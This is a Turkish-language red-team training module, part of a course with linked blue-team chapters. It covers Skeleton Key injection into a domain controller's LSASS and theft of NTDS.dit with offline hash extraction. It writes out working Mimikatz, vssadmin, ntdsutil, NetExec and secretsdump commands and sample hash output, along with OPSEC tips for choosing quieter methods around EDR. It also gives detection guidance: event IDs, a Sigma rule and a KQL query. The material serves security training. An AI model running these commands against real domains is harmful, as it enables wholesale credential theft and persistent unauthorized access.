## 1. Kavramsal Temel — Neden Var?

Bu bölüm iki uç kalıcılık/hasat tekniğini kapsar. **Skeleton Key**, DC'nin LSASS'ine bir "iskelet anahtar" enjekte ederek **her kullanıcının kendi parolasına ek olarak evrensel bir usta parola** ile de giriş yapabilmesini sağlar — gerçek parolalar değişmeden. **NTDS.dit exfiltration** ise domain'in tüm parola veritabanını (`NTDS.dit`) **çevrimdışı** kopyalayıp saldırgan makinesinde işleyerek her hesabın hash'ini toplu çıkarmaktır — [DCSync](./09.1_DCSync_ile_Hash_Cikarma.md)'in "dosya" versiyonu.

**Analoji:** Skeleton Key, bir otelin *tüm oda kilitlerine* gizlice çalışan bir usta anahtar takmaktır — misafirler kendi kartlarını hâlâ kullanır (fark etmezler), ama sen de her kapıyı açarsın. NTDS exfiltration ise otelin **tüm anahtar kayıt defterini fotokopileyip** dışarı çıkarmaktır: artık her kilidin kopyasını evinde üretebilirsin.

**İkisinin yeri:** Skeleton Key **uçucudur** (LSASS'te yaşar, DC yeniden başlarsa kaybolur) ama anında evrensel giriş sağlar. NTDS exfiltration **kalıcı bir kopyadır** (dosya sende) ama offline'dır — hash'leri sonra Golden Ticket/PtH için kullanırsın. Her ikisi de Tier-0 erişimi gerektirir; bunlar "hakimiyetin meyvesini toplama" adımlarıdır.

## 2. Teknik Derinlik

### Skeleton Key
Mimikatz `misc::skeleton`, DC'nin **LSASS sürecine kod enjekte eder** ve Kerberos/NTLM doğrulama fonksiyonunu (`CDLocateCSystem` / RC4 & AES doğrulama yolu) **patch'ler**. Sonuç: doğrulama sırasında, kullanıcının gerçek anahtarına ek olarak sabit bir anahtar (`mimikatz` parolası, NT hash `60ba4fcadc466c7a033c178194c03df6`) da kabul edilir.

```
 Kerberos AS-REQ (user, parola=mimikatz)
        │
        ▼  LSASS (patch'li)
   gerçek anahtar? ── HAYIR ──▶ skeleton anahtarı? ── EVET ──▶ TGT ver
```

**Kısıtlar:** Sadece **RC4/AES downgrade** yoluyla çalışır; **Credential Guard** açıksa LSASS izole olduğundan enjeksiyon başarısız olur ([Blue 3.1](../../2-Blue_Team/Modul_03_Kimlik_Bilgisi_Korumasi/03.1_Credential_Guard_ve_LSASS_Korumasi.md)). DC yeniden başlatılınca patch silinir (uçucu). Her DC'ye ayrı ayrı uygulanmalı.

### NTDS.dit Exfiltration
`NTDS.dit`, ESE (Extensible Storage Engine) veritabanıdır; hash'ler `PEK` (Password Encryption Key) ile şifrelenir, `PEK` de `SYSTEM` hive'ındaki **BootKey (SysKey)** ile şifrelenir. Yani offline çözüm için **hem NTDS.dit hem SYSTEM hive** gerekir.

```
 NTDS.dit (ESE)  +  SYSTEM hive (BootKey)
        │                  │
        ▼                  ▼
   PEK deşifre ◀── BootKey ── PEK ── deşifre ──▶ her hesabın NT hash + Kerberos anahtarları
```

**Kopyalama sorunu:** `NTDS.dit` çalışan DC'de **kilitlidir** (aktif kullanımda). Kilidi aşmak için:
- **VSS (Volume Shadow Copy):** anlık gölge kopya oluştur, kilitsiz kopyayı al (`vssadmin`/`ntdsutil ifm`).
- **`ntdsutil ... create full`** (IFM — Install From Media): meşru yedek mekanizması, NTDS + SYSTEM'i birlikte dışa aktarır.
- **Raw okuma** (`NTFSParser`/`RawCopy`): kilidi bypass eden ham disk okuma.

**PEK deşifre zinciri (bit seviyesi):** NTDS.dit içinde her hesabın `unicodePwd` niteliği çift katmanlıdır:
```
 BootKey (SYSTEM hive, SysKey) ── RC4/AES ──▶ PEK (Password Encryption Key)
        PEK ── RC4 (salt=RID) veya AES(2016+) ──▶ hesap NT hash (16 byte)
```
`BootKey`, `SYSTEM` hive'ındaki dört registry anahtarının (`JD`, `Skew1`, `GBG`, `Data`) `Class` alanlarından türetilir — bu yüzden **SYSTEM hive olmadan** NTDS.dit çözülemez. 2016+ DC'lerde PEK, RC4 yerine **AES-256** ile şifrelenir (`PEK_v3`); secretsdump her iki formatı da destekler. Bu, DCSync'ten temel fark: DCSync canlı session-key çözümü yapar, NTDS offline'da **BootKey → PEK → hash** zincirini saldırgan kendisi yürütür.

**Skeleton Key uçuculuğu vs kalıcılık:** Skeleton Key LSASS bellek patch'i olduğundan **DC yeniden başlatılınca kaybolur** ve her DC'ye ayrı uygulanmalıdır — bu yüzden kalıcı arka kapı değil, "operasyon süresince evrensel giriş"tir. Kalıcılık isteniyorsa [AdminSDHolder/DSRM](./09.3_AdminSDHolder_DCShadow_DSRM.md) gibi disk-tabanlı yöntemler tercih edilir.

## 3. Pratik Uygulama — Çok Araçlı

**A) Skeleton Key (Mimikatz — DC'de SYSTEM):**
```
privilege::debug
misc::skeleton
# Artık her hesaba "mimikatz" parolasıyla giriş:
```
```bash
# Uzaktan doğrulama (herhangi kullanıcı + skeleton parola):
impacket-psexec corp.local/Administrator:mimikatz@dc01.corp.local
```

**B) NTDS.dit — VSS ile kopyalama:**
```cmd
:: DC'de SYSTEM: gölge kopya oluştur
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ndts.dit
reg save HKLM\SYSTEM C:\temp\SYSTEM
```

**C) ntdsutil IFM (meşru yedek yüzeyi):**
```cmd
ntdsutil "activate instance ntds" "ifm" "create full C:\temp\ifm" quit quit
:: C:\temp\ifm\Active Directory\ntds.dit + registry\SYSTEM üretir
```

**D) Uzaktan tek-komut (NetExec / secretsdump):**
```bash
nxc smb dc01.corp.local -u dauser -p Pass --ntds vss          # VSS metoduyla otomatik
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL      # offline çözüm
```

**Örnek çıktı (offline çözüm):**
```
[*] Target system bootKey: 0x8b4e...
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Reading and decrypting hashes from ntds.dit
krbtgt:502:aad3b...:1a59bc0ec...:::
[*] Kerberos keys from ntds.dit
Administrator:aes256-cts-hmac-sha1-96:5e0d...
```

**Gerçek-dünya zinciri:**
```
DA erişimi ──▶ ntdsutil ifm (NTDS+SYSTEM) ──▶ dışarı exfil ──▶ offline secretsdump
        │                                                            │
        ▼                                                            ▼
   Skeleton Key (uçucu evrensel giriş)             tüm hash'ler ──▶ Golden/PtH ──▶ forest (Red 10)
```

| Teknik | MITRE ATT&CK | Kaynak İz (IOC) | Karşı Blue |

| Skeleton Key | **T1556.001** (Modify Auth Process) | LSASS'e enjeksiyon; 7045/servis; RC4 downgrade; 4673 | [Blue 3.1](../../2-Blue_Team/Modul_03_Kimlik_Bilgisi_Korumasi/03.1_Credential_Guard_ve_LSASS_Korumasi.md) |
| NTDS.dit exfil | **T1003.003** (NTDS) | VSS oluşturma (8222); `ntds.dit`/`SYSTEM` dosya erişimi; ntdsutil kullanımı | [Blue 10.3](../../2-Blue_Team/Modul_10_Olay_Mudahalesi_DFIR_ve_Kurtarma/10.3_NTDS_Adli_Analiz_ve_Timeline.md) |
| Offline hash çözümü | T1003.003 | Ağda görünmez (offline); dosya taşınması | [Blue 10.3](../../2-Blue_Team/Modul_10_Olay_Mudahalesi_DFIR_ve_Kurtarma/10.3_NTDS_Adli_Analiz_ve_Timeline.md) |

**OPSEC notları:**
- **Skeleton Key en net iz:** DC'nin LSASS'ine kod enjeksiyonu — modern EDR ve **Credential Guard** bunu doğrudan engeller/yakalar. RC4 downgrade zorlaması ayrı bir anomalidir. Uçucu olduğu için tek DC'de kalıcılık sağlamaz; sistematik kullanım için her DC'ye enjeksiyon = yüksek risk.
- **NTDS iz:** `vssadmin create shadow` (Event 8222) ve `ntds.dit` dosyasına erişim en net göstergedir. **ntdsutil IFM** meşru yedek mekanizması olduğundan daha az şüphelidir ama yine de DC'de nadir bir işlemdir → Blue tarafı ntdsutil/`ntds.dit` erişim denetimiyle avlar.
- **Offline avantajı:** Dosya kopyalandıktan sonra çözüm saldırgan makinesinde yapılır → ağda görünmez. Bu yüzden **exfil anı** (dosya taşınması, DLP) tek yakalanma penceresidir.
- **Kurtarma:** NTDS exfil edildiyse **tüm domain parolaları + krbtgt tehlikededir** → Blue full forest recovery + krbtgt çift-reset planlar ([Blue 10.4](../../2-Blue_Team/Modul_10_Olay_Mudahalesi_DFIR_ve_Kurtarma/10.4_Forest_Recovery_Sureci.md)). Yetkili testte kopyalar **güvenli imha** edilmelidir.
- **DCSync ile NTDS exfil seçimi:** DCSync ağ üzerinden çalışır, kod çalıştırmaz, hedefli tek hesap çekebilir → **daha sessiz**. NTDS exfil, DC'de dosya işlemi/VSS gerektirir → daha gürültülü ama **offline kopya** verir (ağdan kopuk çözüm, tekrar tekrar kullanılır). Operatör, ortamdaki telemetriye göre seçer: EDR yoğunsa DCSync, dosya-taşıma DLP zayıfsa NTDS exfil.
- **Skeleton Key alternatifi:** Cred Guard/EDR nedeniyle skeleton başarısızsa, aynı "evrensel giriş" etkisi [Golden Ticket](./09.2_Golden_Silver_Diamond_Sapphire_Ticket.md) ile (krbtgt hash eldeyse) daha sessiz sağlanır — LSASS'e dokunmadan.

**Tespit mantığı (Blue bakışı):** NTDS exfil için: `vssadmin/wmic shadowcopy create` (8222), `ntds.dit`/`SYSTEM` dosyalarına olağandışı erişim (4663), `ntdsutil.exe`/`diskshadow.exe` çalıştırılması. Skeleton Key için: LSASS'e uzaktan kod/thread enjeksiyonu (EDR), servis oluşturma (7045), RC4 downgrade auth. Bunlar [Blue 10.3 NTDS adli analiz](../../2-Blue_Team/Modul_10_Olay_Mudahalesi_DFIR_ve_Kurtarma/10.3_NTDS_Adli_Analiz_ve_Timeline.md) rutininin merkezindedir.

```cmd

:: 1) ntdsutil ifm ile NTDS+SYSTEM dışa aktar, secretsdump LOCAL ile offline çöz
:: 2) misc::skeleton uygula, "mimikatz" parolasıyla giriş test et (Cred Guard KAPALI VM'de)
```
```powershell
# Blue doğrulama (VSS/NTDS erişimi):
Get-WinEvent -FilterHashtable @{LogName='Application';Id=8222}   # VSS shadow oluşturma
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4663} |
  Where-Object { $_.Message -match 'ntds.dit' }
```

**Sigma kuralı (NTDS exfil — VSS + ntdsutil/diskshadow):**
```yaml
title: NTDS.dit Extraction (VSS / ntdsutil / diskshadow)
logsource: { product: windows, category: process_creation }
detection:
  ntdsutil:
    Image|endswith: '\ntdsutil.exe'
    CommandLine|contains: 'ifm'
  diskshadow: { Image|endswith: '\diskshadow.exe' }
  vss_wmi:
    CommandLine|contains|all: ['shadow', 'create']
  ntds_access:                          # ham dosya kopyalama
    CommandLine|contains: 'ntds.dit'
  condition: ntdsutil or diskshadow or vss_wmi or ntds_access
level: critical
```

**KQL (Skeleton Key — LSASS'e uzaktan enjeksiyon + RC4 downgrade):**
```kusto
DeviceEvents
| where ActionType == "CreateRemoteThread" and FileName == "lsass.exe"
| join kind=inner (
    SecurityEvent | where EventID == 4769 and TicketEncryptionType == "0x17")
  on DeviceName
| project Timestamp, DeviceName, InitiatingProcessFileName
```
Credential Guard açıksa Skeleton Key enjeksiyonu başarısız olur → bu kural asıl "yamasız/korumasız DC" tespitidir ([Blue 3.1](../../2-Blue_Team/Modul_03_Kimlik_Bilgisi_Korumasi/03.1_Credential_Guard_ve_LSASS_Korumasi.md)).
